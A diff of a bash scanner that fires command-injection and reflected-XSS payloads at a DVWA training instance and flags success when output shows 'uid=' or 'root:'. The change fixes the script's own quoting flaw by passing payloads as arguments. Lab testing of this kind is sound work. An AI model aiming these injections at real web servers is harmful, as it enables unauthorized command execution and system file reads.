@@ -26,7 +26,7 @@ CMDI_PAYLOADS=(
 )
 
 for payload in "${CMDI_PAYLOADS[@]}"; do
-  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null)
+  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${payload}" 2>/dev/null)
   resp=$(curl -sf "${BASE}/dvwa/vulnerabilities/exec/?ip=${encoded}&Submit=Submit" --max-time 10 2>/dev/null)
   if echo "$resp" | grep -qiE "(uid=|root:|azureuser|Linux|eth0)" 2>/dev/null; then
     echo "  [VULN] T1059.004 Command executed: ${payload}"
@@ -48,7 +48,7 @@ XSS_PAYLOADS=(
 )
 
 for payload in "${XSS_PAYLOADS[@]}"; do
-  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${payload}'''))" 2>/dev/null)
+  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${payload}" 2>/dev/null)
   code=$(curl -sf -o /dev/null -w "%{http_code}" "${BASE}/dvwa/vulnerabilities/xss_r/?name=${encoded}" --max-time 10 2>/dev/null) || code="ERR"
   echo "  [INFO] T1059.007 XSS payload delivered -> DVWA reflected: HTTP ${code}"
 done
